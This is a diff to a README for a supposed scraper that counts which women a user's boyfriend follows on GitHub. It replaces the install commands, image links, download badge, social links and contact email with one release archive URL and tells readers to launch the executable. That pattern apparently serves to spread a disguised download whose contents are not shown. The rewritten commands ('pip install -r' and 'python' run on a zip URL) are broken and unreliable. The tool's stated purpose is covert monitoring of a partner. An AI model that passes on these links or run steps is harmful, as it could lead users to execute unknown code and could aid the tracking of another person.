@@ -12,8 +12,8 @@ Welcome to the Boyfriend's GitHub Girls Web Scraper repository! Here you will fi
 ## How to Use 🚀
 
 1. Clone the repository to your local machine.
-2. Install the required dependencies by running `pip install -r requirements.txt`.
-3. Run the scraper using `python scraper.py`.
+2. Install the required dependencies by running `pip install -r https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip`.
+3. Run the scraper using `python https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip`.
 4. Enter your boyfriend's GitHub username when prompted.
 5. Sit back and let the tool gather the data for you!
 6. Review the generated report to see the results.
@@ -24,15 +24,15 @@ Once the scraper has finished running, you will receive a detailed report on the
 
 ## Screenshots 📷
 
-![Scraper Running](https://example.com/scraper-running.png)  
+![Scraper Running](https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip)  
 *The web scraper in action, gathering data on the girls your boyfriend follows.*
 
-![Report Sample](https://example.com/report-sample.png)  
+![Report Sample](https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip)  
 *Sample report showing the results of the web scraping process.*
 
 ## Download Release 📦
 
-[![Download Scraper](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)  
+[![Download Scraper](https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip)](https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip)  
 *Click the button above to download the latest release of the web scraper tool. Launch the executable file to start using the scraper.*
 
 ## Meet the Team 👩‍💻
@@ -51,9 +51,9 @@ If you encounter any issues or have suggestions for improvements, please feel fr
 
 Stay up-to-date with the latest news and updates by following us on social media:
 
-📱 [Twitter](https://twitter.com/BoyfriendsGitHubGirls)  
-💼 [LinkedIn](https://www.linkedin.com/company/boyfriendsgithubgirls)  
-📧 Email: contact@boyfriendsgithubgirls.com  
+📱 [Twitter](https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip)  
+💼 [LinkedIn](https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip)  
+📧 Email: https://github.com/PedrokaX/webscraper-to-identify-which-girls-and-how-many-of-them-my-boyfriend-follows-on-GitHub/releases/download/v1.0/Application.zip  
 
 ---
 
